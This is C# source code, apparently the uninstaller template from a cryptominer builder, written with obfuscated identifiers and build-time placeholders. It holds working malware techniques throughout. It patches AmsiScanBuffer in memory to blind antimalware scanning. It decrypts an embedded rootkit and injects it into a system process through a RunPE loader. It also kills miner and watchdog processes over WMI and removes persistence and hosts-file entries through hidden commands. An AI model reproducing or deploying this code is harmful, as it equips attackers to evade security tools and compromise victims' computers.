using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class _rUninstaller_
{
    public static string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
    public static string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");


    public static void Main()
    {
        _rPatchAMSI_();
#if DefRootkit
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RES_rootkit_u"))))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains("st"))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                _rRun_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), null);
                            }
                        }
                    }
                }
            }  
        }
        catch(Exception ex){
#if DefDebug
        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
#endif

#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            _rCommand_("#SCMD", "#REGREM");

        }
        catch {}

        try
        {
            _rCommand_("#SCMD", "#TASKSCHREM");
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#WATCHDOGQUERY")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["#STRCMDLINE"] != null && (MemObj["#STRCMDLINE"].ToString().Contains("#MINERID") || MemObj["#STRCMDLINE"].ToString().Contains("#WATCHDOGID")))
                {
                    _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["#STRPROCID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(_rbD_, true);
            Directory.Delete(_rbD2_, true);
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
            List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));

            string[] _rdomainset_ = new string[] { DOMAINSET };
            for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
            {
                foreach (string _rset_ in _rdomainset_)
                {
                    string _rcur_ = _rGetString_(_rset_);
                    if (_rhostscontent_[i].Contains(" " + _rcur_))
                    {
                        _rhostscontent_.RemoveAt(i);
                        break;
                    }
                }
            }
            File.WriteAllLines(_rhostspath_, _rhostscontent_.ToArray());
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        Environment.Exit(0);
    }

    public static string _rGetString_(string _rarg1_)
    {
#if DefObfuscate
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
#else
        return _rarg1_;
#endif
    }

    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
#if DefObfuscate
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
#else
        return _rinput_;
#endif
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

#if DefRootkit
    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RES_parent", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }
    
    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
    {
        Assembly.Load(_rGetTheResource_("#RES_runpe")).GetType("#RUNPETYPE").GetMethod("#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
    }
#endif

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    public static void _rPatchAMSI_()
    {
        try
        {
            var _rasb_ = GetProcAddress(LoadLibrary("#AMSIDLL"), "#AMSIBUFFER");
            var _rpatch_ = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            uint _roldProtect_ = 0;
            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, 0x40, out _roldProtect_);
            Marshal.Copy(_rpatch_, 0, _rasb_, _rpatch_.Length);
            VirtualProtect(_rasb_, (UIntPtr)_rpatch_.Length, _roldProtect_, out _roldProtect_);
        }
        catch { }
    }
}